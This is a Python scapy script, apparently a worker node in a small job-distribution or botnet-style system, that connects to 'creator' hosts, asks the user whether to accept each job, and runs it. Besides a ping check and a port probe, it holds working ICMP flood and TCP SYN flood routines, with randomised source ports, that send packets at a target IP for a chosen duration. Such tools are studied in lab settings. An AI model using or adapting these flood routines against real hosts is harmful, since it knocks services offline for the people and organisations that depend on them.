import socket
import os
import time
from scapy.all import *


def jobHandler(jobType, jobDesc, jobData, socket):
    if jobType == "check_If_Online":
        icmp = IP(dst=jobData) / ICMP()
        resp = sr1(icmp, timeout=10)
        if resp != None:
            print("\nThe destination is online")
            socket.send("ONLINE".encode())
        else:
            print("\nThe destination is unreachable.")
            socket.send("OFFLINE".encode())
    elif jobType == "detect_Port_Status":
        ipAndPort = jobData.split("*")
        pac = sr1(IP(dst=ipAndPort[0]) / TCP(dport=int(ipAndPort[1])), timeout=1)
        try:
            pac.show()
            print("The port is open")
            socket.send("PORT OPEN".encode())
        except:
            print("The port is closed")
            socket.send("PORT CLOSED".encode())
    elif jobType == "icmp_flood_attack":
        ipAndTime = jobData.split("*")
        timeout = time.time() + int(ipAndTime[1])
        while time.time() < timeout:
            send(IP(dst=ipAndTime[0]) / ICMP(), count=1000)
        print("ICMP flood finished\n")
        socket.send("Flood_finished".encode())
    elif jobType == "tcp_flood_attack":
        ip_port_Time = jobData.split("*")
        timeout = time.time() + int(ip_port_Time[2])

        while time.time() < timeout:
            send(IP(dst=ip_port_Time[0])/TCP(sport=RandShort(), dport=int(ip_port_Time[1]), flags="S"), count = 1000)
        print("TCP flood finished\n")
        socket.send("Flood_finished".encode())


def Main():
    # add creator host IP's here
    host = ['127.0.0.1', '127.0.0.1']
    port = [5000, 5001]

    i = -1
    while True:
        i += 1
        if i == len(host):
            i = 0
        while True:
            try:
                # print("Asking " + host[i] + ":" + str(port[i]) + " for a job...")
                print("looking for " + host[i] + ":" + str(port[i]))
                mySocket = socket.socket()
                mySocket.connect((host[i], port[i]))
                break
            except:
                break
        data = ""
        mySocket.settimeout(1)
        try:
            data = mySocket.recv(1024).decode()
        except:
            pass
        if data == "":
            pass
        else:
            data = str(data)
            # print("Job found from creater : " + data)
            print("Message recieved from creator\n" + data)
            status = input("Accept job? Y/N: ").upper()

            mySocket.send(status.encode())
            if (status == "Y"):
                mySocket.settimeout(45)
                print("Waiting for creator to respond")

                # try:
                jobRECEIVE = mySocket.recv(1024).decode()
                jobSPLIT = jobRECEIVE.split("$")
                print(jobSPLIT[0])
                #print(jobSPLIT[1])
                #print(jobSPLIT[2])
                jobHandler(jobSPLIT[0], jobSPLIT[1], jobSPLIT[2], mySocket)
                # except:
                #   print("Uh oh. The creator was too slow!")
            # data=mySocket.recv(1024).decode()
            # print(f"message is {data}")
     
        mySocket.close()


if __name__ == '__main__':
    Main()
